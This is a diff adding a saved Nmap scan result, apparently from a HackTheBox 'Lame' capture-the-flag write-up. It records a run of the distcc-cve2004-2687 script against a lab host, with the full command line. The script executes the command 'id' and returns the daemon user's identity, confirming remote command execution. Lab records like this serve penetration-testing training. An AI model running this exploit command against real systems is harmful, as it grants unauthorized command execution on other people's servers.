@@ -1,0 +1,30 @@
+# Nmap 7.70 scan initiated Fri Nov  1 12:53:07 2019 as: nmap -vv --reason -Pn -sV -p 3632 --script=banner,distcc-cve2004-2687 --script-args=distcc-cve2004-2687.cmd=id -oN /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/tcp_3632_distcc_nmap.txt -oX /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/xml/tcp_3632_distcc_nmap.xml 10.10.10.3
+Nmap scan report for 10.10.10.3
+Host is up, received user-set (1.2s latency).
+Scanned at 2019-11-01 12:53:10 PDT for 27s
+
+PORT     STATE SERVICE REASON         VERSION
+3632/tcp open  distccd syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+| distcc-cve2004-2687: 
+|   VULNERABLE:
+|   distcc Daemon Command Execution
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2004-2687
+|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+|       Allows executing of arbitrary commands on systems running distccd 3.1 and
+|       earlier. The vulnerability is the consequence of weak service configuration.
+|       
+|     Disclosure date: 2002-02-01
+|     Extra information:
+|       
+|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
+|   
+|     References:
+|       http://distcc.googlecode.com/svn/trunk/doc/web/security.html
+|       http://http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2004-2687
+|       http://http://www.osvdb.org/13378
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Nov  1 12:53:37 2019 -- 1 IP address (1 host up) scanned in 30.12 seconds
